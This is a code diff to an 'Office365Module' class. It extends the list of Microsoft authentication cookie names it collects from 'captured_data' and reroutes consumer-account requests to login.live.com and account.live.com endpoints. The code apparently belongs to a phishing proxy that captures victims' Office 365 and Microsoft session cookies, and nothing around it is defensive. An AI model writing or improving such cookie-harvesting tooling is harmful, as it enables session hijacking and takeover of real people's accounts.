@@ -262,7 +262,7 @@ class Office365Module(BaseModule):
                                 if cookie.get('name'):
                                     name = cookie['name'].upper()
                                     # Look for authentication cookies, not just tracking
-                                    if any(important in name for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'RTFA', 'FEDAUTH', 'SESSIONID']):
+                                    if any(important in name for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'RTFA', 'FEDAUTH', 'SESSIONID', 'PPAUTH', 'MSPAUTH', 'MSPRAUTH', 'MSPREQU']):
                                         significant_cookies.append(cookie['name'])
                         
                         cookie_count = len(captured_data.get('cookies', []))
@@ -481,7 +481,7 @@ class Office365Module(BaseModule):
                         name_upper = name.upper()
                         
                         # Categorize cookies
-                        if any(important in name_upper for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'RTFA', 'FEDAUTH', 'SESSIONID']):
+                        if any(important in name_upper for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'RTFA', 'FEDAUTH', 'SESSIONID', 'PPAUTH', 'MSPAUTH', 'MSPRAUTH', 'MSPREQU']):
                             auth_cookies.append(name)
                         elif name_upper == 'FPC':
                             tracking_cookies.append(name)
@@ -658,12 +658,12 @@ class Office365Module(BaseModule):
                 is_personal = any(domain in self.user.lower() for domain in personal_domains)
                 
                 if is_personal:
-                    # For personal accounts, route to appropriate Microsoft consumer domain
-                    if 'consumers' in path or 'fido' in path or 'microsoft.com' in path:
-                        target_url = f"https://login.microsoft.com/{path}"
-                    elif 'account' in path:
+                    # For personal (consumer) accounts, use the live.com endpoints
+                    if 'account' in path:
+                        # Account management pages live under account.live.com
                         target_url = f"https://account.live.com/{path}"
                     else:
+                        # All other consumer authentication endpoints are served from login.live.com
                         target_url = f"https://login.live.com/{path}"
                 else:
                     # For organizational accounts, use login.microsoftonline.com
